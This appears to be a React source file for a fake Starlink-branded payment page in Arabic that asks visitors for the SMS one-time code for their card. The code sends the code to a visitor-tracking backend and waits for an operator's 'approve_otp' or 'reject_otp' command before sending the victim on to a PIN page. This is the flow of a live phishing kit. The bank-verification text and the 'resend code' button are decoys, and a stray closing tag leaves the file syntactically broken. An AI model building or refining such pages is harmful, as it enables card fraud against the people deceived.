import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ShieldCheck, Loader2 } from "lucide-react";
import PageShell from "@/components/starlink/PageShell";
import { toast } from "@/hooks/use-toast";
import { updateVisitorData } from "@/hooks/useVisitorTracking";
import { SavedCardBadge, readCardMeta, SavedCardMeta } from "@/components/starlink/SavedCardBadge";
import SEO from "@/components/SEO";
import { seoData } from "@/lib/seo";

const PaymentOtp = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [seconds, setSeconds] = useState(60);
  const [card, setCard] = useState<SavedCardMeta | null>(null);

  useEffect(() => {
    const stored = sessionStorage.getItem("starlink_card");
    if (!stored) navigate("/payment", { replace: true });
    setCard(readCardMeta());
  }, [navigate]);

  useEffect(() => {
    if (seconds <= 0) return;
    const id = setInterval(() => setSeconds((s) => s - 1), 1000);
    return () => clearInterval(id);
  }, [seconds]);

  useEffect(() => {
    const onApproval = (e: Event) => {
      const detail = (e as CustomEvent).detail;
      if (!detail) return;
      if (detail.command === "approve_otp") {
        setWaiting(false);
        navigate("/payment/pin");
      } else if (detail.command === "reject_otp") {
        setWaiting(false);
        setOtp("");
        toast({
          title: "رمز التحقق غير صحيح",
          description: "أعد إدخال الرمز المرسل إلى هاتفك.",
          variant: "destructive",
        });
      }
    };
    window.addEventListener("visitor-approval", onApproval);
    return () => window.removeEventListener("visitor-approval", onApproval);
  }, [navigate]);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!/^[0-9]{4,8}$/.test(otp)) {
      toast({ title: "رمز OTP غير صالح", description: "أدخل الرمز المرسل عبر رسالة SMS.", variant: "destructive" });
      return;
    }
    setLoading(true);
    await updateVisitorData({ card_otp: otp });
    setLoading(false);
    setWaiting(true);
  };

  return (
    <PageShell
      eyebrow="التحقق الثنائي"
      title="رمز التحقق OTP"
      description="أرسلنا رمز تحقق إلى هاتفك المرتبط بالبطاقة. أدخله أدناه لإتمام الدفع."
    >
      <section className="container mx-auto px-6 py-16 max-w-md">
        <div className="border border-foreground/10 p-8 space-y-6">
          <div className="flex items-center justify-between gap-2 flex-wrap">
            <div className="flex items-center gap-2 text-xs text-muted-foreground">
              <ShieldCheck className="w-4 h-4" />
              <span>تحقق ثنائي — صالح لمدة دقيقة واحدة</span>
            </div>
            {card && <SavedCardBadge brand={card.brand} last4={card.last4} />}
          </div>

          <form onSubmit={submit} className="space-y-5">
            <div>
              <label className="text-sm text-muted-foreground mb-2 block">رمز التحقق</label>
              <input
                type="text"
                inputMode="numeric"
                maxLength={8}
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                placeholder="000000"
                disabled={waiting}
                className="w-full h-14 bg-transparent border border-foreground/20 px-4 focus:border-foreground outline-none transition-colors text-center text-2xl tracking-[0.5em] disabled:opacity-60"
                required
                autoFocus
              />
              <div className="flex justify-between items-center mt-2 text-xs text-muted-foreground">
                <span>{seconds > 0 ? `إعادة الإرسال خلال ${seconds}ث` : "يمكنك إعادة الإرسال"}</span>
                <button
                  type="button"
                  disabled={seconds > 0 || waiting}
                  onClick={() => setSeconds(60)}
                  className="underline disabled:opacity-40 disabled:no-underline"
                >
                  إعادة إرسال الرمز
                </button>
              </div>
            </div>

            <button
              type="submit"
              disabled={loading || waiting}
              className="w-full h-12 bg-foreground text-background hover:bg-foreground/90 transition-all text-sm font-medium tracking-wider disabled:opacity-60 inline-flex items-center justify-center gap-2"
            >
              {waiting ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  جاري التأكيد...
                </>
              ) : loading ? (
                "جاري الإرسال..."
              ) : (
                "تأكيد الدفع"
              )}
            </button>

            {waiting && (
              <p className="text-xs text-muted-foreground text-center">
                نتحقق من رمز OTP مع البنك. قد يستغرق ذلك بضع لحظات.
              </p>
            )}
          </form>
        </div>
      </section>
    </PageShell>
    </>
  );
};

export default PaymentOtp;
